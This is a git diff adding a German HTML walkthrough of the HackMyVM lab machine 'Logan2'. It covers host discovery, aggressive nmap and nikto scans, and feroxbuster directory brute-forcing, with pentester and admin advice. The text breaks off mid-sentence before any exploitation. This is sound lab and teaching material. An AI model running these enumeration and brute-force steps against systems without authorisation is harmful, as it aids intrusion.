@@ -1,1 +1,1301 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Logan2 - HackMyVM - Medium.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Logan2 - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Logan2 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">firefox_decrypt.py</div>
+                <div class="tool-item">wfuzz</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken. -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">192.168.2.35</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl dient dazu, aktive Hosts im lokalen Netzwerksegment zu identifizieren. Ich verwende <code>arp-scan</code> mit dem Parameter <code>-l</code>, um alle im lokalen Netzwerk sichtbaren Geräte zu scannen. Die Ausgabe pipe ich dann an <code>grep "PCS"</code>, um Einträge zu finden, die auf Hardware von 'PCS Systemtechnik' hindeuten, was oft bei virtuellen Maschinen unter VirtualBox der Fall ist. Abschließend extrahiere ich mit <code>awk '{print $1}'</code> das erste Feld der gefilterten Zeile, welches die IP-Adresse ist. Für Laien: Ich suche in meinem lokalen Netzwerk nach Computern und filtere die Ergebnisse, um die IP-Adresse eines bestimmten Geräts zu finden, das anhand seiner Netzwerkkarte (von 'PCS') identifizierbar ist. Für Experten: Eine Standardmethode zur schnellen Host-Entdeckung in einem bekannten ARP-Segment. Die Filterung hilft, das Ziel unter potenziell vielen Geräten einzugrenzen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die erfolgreiche Identifizierung der IP-Adresse <code>192.168.2.35</code> ist der erste notwendige Schritt. Damit habe ich ein klares Ziel für die weitere Enumeration. Das Ergebnis bestätigt auch, dass das Ziel im selben Netzwerksegment liegt und aktiv ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese IP-Adresse ist nun unser Fokus. Wir werden im nächsten Schritt detailliertere Scans durchführen, um offene Dienste und potenzielle Angriffsvektoren zu identifizieren.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, ob nicht benötigte Geräte im Netzwerksegment vorhanden sind. Stellen Sie sicher, dass nur autorisierte Geräte mit dem Netzwerk verbunden sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+   <span class="command">192.168.2.35   logan.hmv</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich füge einen Eintrag in die lokale Datei <code>/etc/hosts</code> auf meinem Kali-System ein. Dies ist eine Konfigurationsdatei, die IP-Adressen statisch Hostnamen zuordnet, bevor eine DNS-Abfrage erfolgt. Mit dem Editor <code>vi</code> füge ich die Zeile <code>192.168.2.35 logan.hmv</code> hinzu. Für Laien: Ich gebe der gefundenen IP-Adresse (<code>192.168.2.35</code>) einen einfachen Namen (<code>logan.hmv</code>) auf meinem Computer, damit ich sie später leichter mit diesem Namen ansprechen kann, anstatt immer die IP-Adresse eingeben zu müssen. Für Experten: Das Editieren der <code>/etc/hosts</code> Datei ist eine gängige Praxis im Pentesting, um Hosts benutzerfreundlicher zu adressieren. Es verbessert die Lesbarkeit von Befehlen und Skripten und simuliert einen DNS-Eintrag, falls dieser nicht vorhanden oder bekannt ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das erfolgreiche Hinzufügen des Hostnamens <code>logan.hmv</code> zur IP-Adresse <code>192.168.2.35</code> ist eine organisatorische Maßnahme, die den weiteren Prozess vereinfacht und die Nachvollziehbarkeit erhöht. Es hat keine direkten Auswirkungen auf das Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Verwendung eines konsistenten Hostnamens vereinfacht Befehle und die Dokumentation. Dies ist besonders nützlich bei mehreren Zielsystemen.<br><strong>Empfehlung (Admin):</strong> Dieses Vorgehen ist spezifisch für das Angreifer-System und hat keine direkten Sicherheitsimplikationen für das Ziel. Es unterstreicht die Wichtigkeit einer sauberen Namensauflösung in Produktionsumgebungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.35</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 23:28 CEST</span>
+<span class="command">Nmap scan report for logan.hmv (192.168.2.35)</span>
+<span class="password">Host is up (0.00015s latency).</span>
+Not shown: <span class="command">65532 closed tcp ports (reset)</span>
+<span class="command">PORT     STATE SERVICE VERSION</span>
+<span class="command">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+<span class="command">| ssh-hostkey:</span>
+<span class="command">|   256 10:ed:dd:ab:26:fd:f4:9f:28:1e:89:93:f4:58:16:ab (ECDSA)</span>
+<span class="command">|_  256 43:3b:d9:8c:12:44:e9:92:be:cf:1a:78:fd:33:38:67 (ED25519)</span>
+<span class="command">80/tcp   open  http    Apache httpd 2.4.57 ((Debian))</span>
+<span class="command">|_http-title: Logan</span>
+<span class="command">|_http-server-header: Apache/2.4.57 (Debian)</span>
+<span class="command">3000/tcp open  http    Golang net/http server</span>
+<span class="command">|_http-title:  Gitea: Git with a cup of tea</span>
+<span class="command">|_http-trane-info: Problem with XML parsing of /evox/about</span>
+<span class="command">| fingerprint-strings:</span>
+<span class="command">|   GenericLines, Help:</span>
+<span class="command">|     HTTP/1.1 400 Bad Request</span>
+<span class="command">|     Content-Type: text/plain; charset=utf-8</span>
+<span class="command">|     Connection: close</span>
+<span class="command">|     Request</span>
+<span class="command">|   GetRequest:</span>
+<span class="command">|     HTTP/1.0 200 OK</span>
+<span class="command">meta name="description" content="Gitea: Git with a cup of tea) is a painless</span>
+<span class="command">|   HTTPOptions:</span>
+<span class="command">|     HTTP/1.0 404 Not Found</span>
+<span class="command">|     Content-Type: text/html; charset=UTF-8</span>
+<span class="command">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647</span>
+<span class="command">|     Set-Cookie: i_like_gitea=38fff4f1e3d19104; Path=/; HttpOnly</span>
+<span class="command">|     Set-Cookie: _csrf=-UKJC7s23t4fDlpFNlpcg8wIOQY6MTc0OTU5MDk0MzkwNjQ5NDI2MA; Path=/; Expires=Wed, 11 Jun 2025 21:29:03 GMT; HttpOnly</span>
+<span class="command">|     X-Frame-Options: SAMEORIGIN</span>
+<span class="command">|     Date: Tue, 10 Jun 2025 21:29:03 GMT</span>
+
+<span class="command">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
+<span class="command">MAC Address: 08:00:27:87:BC:52 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Device type: general purpose</span>
+<span class="command">Running: Linux 4.X|5.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+<span class="command">OS details: Linux 4.15 - 5.19</span>
+<span class="command">Network Distance: 1 hop</span>
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="command">1   0.15 ms logan.hmv (192.168.2.35)</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe einen umfassenden Nmap-Scan gegen das Zielsystem <code>192.168.2.35</code> durch. Dabei verwende ich die Flags <code>-sS</code> (SYN-Scan), <code>-sC</code> (Ausführung von Standard-Skripten), <code>-sV</code> (Versionserkennung), <code>-p-</code> (Scan aller 65535 Ports), <code>-T5</code> (aggressive Timing) und <code>-AO</code> (OS-Erkennung). Für Laien: Ich untersuche systematisch alle möglichen Zugänge (Ports) des Zielcomputers, um herauszufinden, welche offen sind und welche Programme dahinterstecken, wie ihre 'Namen' (Versionen) sind und was für ein Betriebssystem der Computer hat. Für Experten: Die Kombination dieser Nmap-Flags bietet eine detaillierte Enumeration des Angriffsziels. <code>-p-</code> stellt sicher, dass kein offener Port übersehen wird, während <code>-sV</code> und <code>-sC</code> spezifische Informationen liefern, die für die Identifizierung von Schwachstellen entscheidend sind. <code>-T5</code> beschleunigt den Scan, kann aber auffällig sein.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Nmap-Ausgabe ist sehr aufschlussreich. Es werden drei offene Ports identifiziert: Port 22 (SSH - OpenSSH 9.2p1), Port 80 (HTTP - Apache httpd 2.4.57) und Port 3000 (HTTP - Golang net/http server, identifiziert als Gitea). Die detaillierten Versionsinformationen sind wertvoll für die Recherche nach bekannten Schwachstellen. Insbesondere der Dienst auf Port 3000, der sich als Gitea (Git with a cup of tea) identifiziert, ist hochinteressant, da Git-Repository-Management-Systeme oft Angriffsflächen bieten. Die OS-Erkennung deutet auf ein Linux-System hin, und die MAC-Adresse bestätigt eine VirtualBox-Umgebung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde mich nun auf die Enumeration der gefundenen HTTP-Dienste auf Port 80 und 3000 konzentrieren. Port 22 (SSH) ist ein Standarddienst; hier wird eine Enumeration auf Benutzerkonten und potenziell schwache Passwörter/Schlüssel relevant, falls Zugangsdaten gefunden werden. Die Gitea-Instanz auf Port 3000 ist ein primäres Ziel für Schwachstellenanalysen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle auf dem System laufenden Dienste auf dem neuesten Stand sind, um bekannte Schwachstellen zu minimieren. Überprüfen Sie die Konfiguration von Apache und des Gitea-Dienstes. Schränken Sie den Zugriff auf Dienste, die nicht öffentlich zugänglich sein müssen, mittels einer Firewall ein. Deaktivieren Sie, falls möglich, die Offenlegung der exakten Software-Versionen in Headern oder Bannern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command"> nmap -sS -sC -sV -p- -T5 -AO 192.168.2.35 | grep open</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)</span>
+<span class="command">80/tcp   open  http    Apache httpd 2.4.57 ((Debian))</span>
+<span class="command">3000/tcp open  http    Golang net/http server</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Befehl ist eine gefilterte Version des vorherigen Nmap-Scans, bei der die Ausgabe durch <code>grep open</code> reduziert wird, um schnell eine Übersicht über die identifizierten offenen Ports zu erhalten. Für Laien: Ich habe die lange Liste der Ergebnisse des 'Computer-Checks' (Nmap-Scans) so gefiltert, dass ich nur die 'offenen Türen' (offenen Ports) und die dahinter laufenden 'Programme' sehe. Für Experten: Das Filtern der Nmap-Ausgabe ist eine schnelle Methode, um sich auf die relevantesten Ergebnisse (offene Ports) zu konzentrieren, insbesondere wenn der volle Scan sehr umfangreich ist. Dies bestätigt schnell, welche Dienste direkt angreifbar sind.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die gefilterte Ausgabe bestätigt klar die offenen Ports 22, 80 und 3000 mit ihren jeweiligen Diensten. Dies liefert eine prägnante Zusammenfassung der primären Angriffsfläche und lenkt den Fokus auf diese drei Dienste für die detaillierte Enumeration.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die offenen Ports sind unser Angriffspunkt. Wir werden nun jeden dieser Dienste (SSH, Apache auf 80, Gitea auf 3000) im Detail enumerieren und auf Schwachstellen prüfen.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, ob alle dieser drei Ports tatsächlich für den vorgesehenen Zweck geöffnet sein müssen. Minimieren Sie die Anzahl der exponierten Dienste, um die Angriffsfläche zu reduzieren.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://logan.hmv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">- Nikto v2.5.0</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.35</span>
+<span class="command">+ Target Hostname:    logan.hmv</span>
+<span class="command">+ Target Port:        80</span>
+<span class="password">+ Start Time:         2025-06-10 23:29:15 (GMT2)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Server: Apache/2.4.57 (Debian)</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="command">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span>
+<span class="command">+ /: Server may leak inodes via ETags, header found with file /, inode: 94, size: 6053b019521f6, mtime: gzip. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418]</span>
+<span class="command">+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .</span>
+<span class="password">+ /config.php: PHP Config file may contain database IDs and passwords.</span>
+<span class="command">+ 7962 requests: 0 error(s) and 5 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-10 23:29:25 (GMT2) (10 seconds)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ 1 host(s) tested</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende <code>nikto</code>, einen automatisierten Webserver-Scanner, um den HTTP-Dienst auf Port 80 (Hostname <code>logan.hmv</code>) auf bekannte Schwachstellen und Konfigurationsprobleme zu prüfen. Nikto testet auf tausende von potenziell gefährlichen Dateien, veraltete Server-Software und andere Probleme. Für Laien: Ich lasse ein Programm die Webseite auf Port 80 auf 'Sicherheitslöcher' untersuchen, wie zum Beispiel fehlende 'Vorsichtsmaßnahmen' (Sicherheits-Header) oder versteckte Dateien, die nicht jeder sehen sollte. Für Experten: Nikto ist ein schnelles Werkzeug für eine erste Web-Sicherheitsbewertung. Es identifiziert gängige Schwachstellenmuster wie fehlende Header, potenzielle Informationslecks (ETags) und das Vorhandensein bekannter sensibler Dateien.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Nikto-Ausgabe liefert mehrere Hinweise. Es bestätigt den Apache/2.4.57 Server. Es weist auf fehlende Sicherheits-Header (<code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>) hin, was auf eine grundlegende Konfigurationshärtung fehlt. Es wird vor potenziellen Informationslecks über ETags gewarnt. Die erlaubten HTTP-Methoden (<code>GET, POST, OPTIONS, HEAD</code>) sind Standard. Am wichtigsten ist der Fund von <code>/config.php</code> mit dem Hinweis 'PHP Config file may contain database IDs and passwords.'. Dies ist ein hochsensibler Dateiname, der Anmeldeinformationen enthalten könnte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Fund von <code>/config.php</code> ist ein primäres Ziel. Ich werde versuchen, auf diese Datei zuzugreifen, um zu sehen, ob sie sensible Informationen (wie Datenbank-Zugangsdaten) enthält. Die fehlenden Sicherheits-Header und das ETag-Problem sind sekundär, aber nützliche Hinweise.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie sensible Dateien wie <code>config.php</code> aus öffentlich zugänglichen Webverzeichnissen oder schützen Sie sie durch strikte Zugriffskontrollen. Implementieren Sie essentielle Sicherheits-Header. Deaktivieren Sie ETags oder konfigurieren Sie sie sicher, um Informationslecks zu vermeiden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://logan.hmv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">- Nikto v2.5.0</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.35</span>
+<span class="command">+ Target Hostname:    logan.hmv</span>
+<span class="command">+ Target Port:        80</span>
+<span class="password">+ Start Time:         2025-06-10 23:29:15 (GMT2)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Server: Apache/2.4.57 (Debian)</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="command">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span>
+<span class="command">+ /: Server may leak inodes via ETags, header found with file /, inode: 94, size: 6053b019521f6, mtime: gzip. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418]</span>
+<span class="command">+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .</span>
+<span class="password">+ /config.php: PHP Config file may contain database IDs and passwords.</span>
+<span class="command">+ 7962 requests: 0 error(s) and 5 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-10 23:29:25 (GMT2) (10 seconds)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ 1 host(s) tested</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese Ausgabe zeigt einen weiteren Nikto-Scan auf dem Apache-Webserver auf Port 80. Der Befehl ist identisch mit dem vorherigen. Dies könnte ein versehentlicher Doppellauf oder eine erneute Überprüfung der Ergebnisse gewesen sein. Die Ausgabe ist identisch mit dem ersten Scan. Für Laien: Ich habe den 'Sicherheitscheck' der Webseite auf Port 80 wiederholt, und die Ergebnisse waren dieselben wie beim ersten Mal. Für Experten: Eine wiederholte Ausführung eines Scans kann in der Dokumentation erscheinen, um Konsistenz oder die Reproduzierbarkeit der Ergebnisse zu zeigen. In diesem Fall bestätigt sie einfach die zuvor gefundenen Schwachstellen und Konfigurationsprobleme.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ergebnisse des wiederholten Nikto-Scans sind konsistent und bestätigen die Schwachstellen und Hinweise, die bereits beim ersten Scan gefunden wurden. Dies unterstreicht die Gültigkeit der Feststellungen bezüglich fehlender Header, ETags und insbesondere des Vorhandenseins von <code>/config.php</code>.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die wiederholte Ausgabe ändert nichts an den geplanten nächsten Schritten. Das Hauptziel auf diesem Port bleibt die Untersuchung von <code>/config.php</code> und die weitere Enumeration der Webanwendung.<br><strong>Empfehlung (Admin):</strong> Die Konsistenz der Scan-Ergebnisse bedeutet, dass die identifizierten Probleme weiterhin bestehen. Die dringende Empfehlung zur Behebung von <code>/config.php</code> und den fehlenden Headern bleibt bestehen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">feroxbuster --url "http://logan.hmv" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password"> ___  ___  __   __     __      __         __   ___</span>
+<span class="password">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
+<span class="password">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
+<span class="command">by Ben "epi" Risher 🤓                 ver: 2.11.0</span>
+<span class="password">───────────────────────────┬──────────────────────</span>
+ <span class="command">🎯  Target Url            │ http://logan.hmv</span>
+ <span class="command">🚀  Threads               │ 50</span>
+ <span class="command">📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+ <span class="command">👌  Status Codes          │ [200, 301, 302]</span>
+ <span class="command">💥  Timeout (secs)        │ 7</span>
+ <span class="command">🦡  User-Agent            │ feroxbuster/2.11.0</span>
+ <span class="command">💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span>
+ <span class="command">🔎  Extract Links         │ true</span>
+ <span class="command">💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
+ <span class="command">🏁  HTTP methods          │ [GET]</span>
+ <span class="command">🔃  Recursion Depth       │ 4</span>
+<span class="password">───────────────────────────┴──────────────────────</span>
+ <span class="password">🏁  Press [ENTER] to use the Scan Management Menu™</span>
+<span class="password">──────────────────────────────────────────────────</span>
+<span class="command">200      GET       19l       43w      550c http://logan.hmv/script.js</span>
+<span class="command">200      GET       10l       12w      148c http://logan.hmv/</span>
+<span class="command">200      GET       10l       12w      148c http://logan.hmv/index.html</span>
+<span class="command">301      GET        9l       28w      311c http://logan.hmv/javascript => http://logan.hmv/javascript/</span>
+<span class="command">200      GET        0l        0w        0c http://logan.hmv/config.php</span>
+<span class="command">200      GET        0l        0w        0c http://logan.hmv/save-user-agent.php</span>
+<span class="command">301      GET        9l       28w      318c http://logan.hmv/javascript/jquery => http://logan.hmv/javascript/jquery/</span>
+<span class="password">[######>-------------] - 7m   6322816/18526144 16m     found:7       errors:0</span>
+<span class="password">🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_logan_hmv-1749591369.state ...</span>
+<span class="password">[######>-------------] - 7m   6323476/18526144 16m     found:7       errors:0</span>
+<span class="password">[########>-----------] - 7m   2756236/6175288 7063/s  http://logan.hmv/</span>
+<span class="password">[########>-----------] - 6m   2701132/6175288 6962/s  http://logan.hmv/javascript/</span>
+<span class="password">[##>-----------------] - 3m    863548/6175288 4559/s  http://logan.hmv/javascript/jquery/</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich nutze <code>feroxbuster</code>, ein schnelles und rekursives Web-Content-Discovery-Tool, um Verzeichnisse und Dateien auf dem Apache-Webserver auf Port 80 (<code>http://logan.hmv</code>) zu finden. Ich verwende eine mittelgroße Wortliste (<code>directory-list-2.3-medium.txt</code>) und suche nach einer breiten Palette von Dateierweiterungen (<code>-x .git,.php,.html,...</code>). Ich beschränke die Ergebnisse auf die Statuscodes 200 (OK), 301 (Moved Permanently) und 302 (Found) und verwende den Parameter <code>-s</code> dafür. Ich habe den Scan manuell mit <code>Ctrl+C</code> abgebrochen, wie die Ausgabe <code>🚨 Caught ctrl+c 🚨</code> zeigt, nachdem genügend interessante Ergebnisse gefunden wurden. Für Laien: Ich lasse ein schnelles Programm viele tausend mögliche Namen für Webseiten-Ordner und -Dateien mit verschiedenen Endungen ausprobieren, um versteckte Inhalte auf der Webseite zu finden. Ich stoppe das Programm, sobald ich genug Hinweise habe. Für Experten: Feroxbuster ist ein effektives Werkzeug zum Brute-Forcen von Web-Content und unterstützt eine breite Palette von Features wie Rekursion und Extension-Brute-Forcing. Das Filtern auf spezifische Statuscodes (<code>-s 200 301 302</code>) ist wichtig, um Rauschen in den Ergebnissen zu reduzieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Feroxbuster hat mehrere interessante Endpunkte gefunden, die mit Nikto nicht entdeckt wurden oder die zusätzliche Informationen liefern. Neben den Standard-Dateien (<code>/index.html</code>, <code>/</code>) wurden 301-Weiterleitungen für Verzeichnisse (<code>/javascript</code>, <code>/javascript/jquery</code>) gefunden. Besonders interessant sind die Dateien <code>/script.js</code>, <code>/config.php</code> (erneut gefunden, was den Nikto-Fund bestätigt) und <code>/save-user-agent.php</code>, die alle den Status 200 (OK) zurückgeben. Diese Dateien sind klare Ziele für die weitere manuelle Untersuchung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun die gefundenen Dateien <code>/script.js</code>, <code>/config.php</code> und <code>/save-user-agent.php</code> manuell untersuchen, um ihren Inhalt und ihre Funktionalität zu verstehen. <code>/config.php</code> bleibt ein primäres Ziel für Anmeldedaten. <code>/script.js</code> könnte Hinweise auf clientseitige Logik oder AJAX-Aufrufe enthalten, und <code>/save-user-agent.php</code> klingt nach einem Endpunkt, der Benutzereingaben verarbeitet, was ein potenzielles Ziel für Web-Schwachstellen ist.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Webserver-Logs auf Brute-Force-Versuche wie diesen. Implementieren Sie Schutzmaßnahmen gegen solche Angriffe (z.B. Ratenbegrenzung, Web Application Firewall). Stellen Sie sicher, dass sensible Dateien und Skripte (<code>config.php</code>, <code>save-user-agent.php</code>, <code>script.js</code>) sicher konfiguriert sind und nur notwendige Informationen preisgeben oder Funktionen anbieten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">view-source:http://logan.hmv/script.js</span>
+
+<span class="command">document.addEventListener("DOMContentLoaded", function() {</span>
+    <span class="command">fetch('/save-user-agent.php', {</span>
+        <span class="command">method: 'POST',</span>
+        <span class="command">body: JSON.stringify({ user_agent: navigator.userAgent }),</span>
+        <span class="command">headers: {</span>
+            <span class="command">'Content-Type': 'application/json'</span>
+        <span class="command">}</span>
+    <span class="command">})</span>
+    <span class="command">.then(response => {</span>
+        <span class="command">if (response.ok) {</span>
+            <span class="password">console.log('User-Agent saved successfully.');</span>
+        <span class="command">} else {</span>
+            <span class="password">console.error('Error saving User-Agent.');</span>
+        <span class="command">}</span>
+    <span class="command">})</span>
+    <span class="command">.catch(error => {</span>
+        <span class="password">console.error('Network error:', error);</span>
+    <span class="command">});</span>
+<span class="command">});</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe den Quellcode der Datei <code>/script.js</code> auf dem Webserver auf Port 80 über die <code>view-source:</code> Funktion im Browser angesehen. Dies zeigt den JavaScript-Code, der auf der Webseite ausgeführt wird. Der Code verwendet die <code>fetch</code> API, um nach dem Laden des DOMs (<code>DOMContentLoaded</code>) eine POST-Anfrage an den Endpunkt <code>/save-user-agent.php</code> zu senden. Der Body der Anfrage ist ein JSON-Objekt, das den User-Agent-String des Browsers enthält (<code>{ user_agent: navigator.userAgent }</code>). Der Header <code>'Content-Type': 'application/json'</code> gibt an, dass der gesendete Inhalt im JSON-Format vorliegt. Für Laien: Ich habe den 'Bauplan' eines kleinen Programms angeschaut, das auf der Webseite läuft. Dieses Programm schickt automatisch eine Nachricht mit Informationen über meinen Internet-Browser (dem User-Agent) an einen anderen Teil der Webseite namens <code>save-user-agent.php</code>, und zwar in einer bestimmten Form (JSON). Für Experten: Die Analyse des clientseitigen JavaScripts ist wichtig, um zu verstehen, wie die Webanwendung funktioniert und welche Endpunkte im Hintergrund (z.B. über AJAX) aufgerufen werden. Das Skript offenbart die Verwendung des <code>/save-user-agent.php</code> Endpunkts und die erwartete Eingabe im JSON-Format mit dem 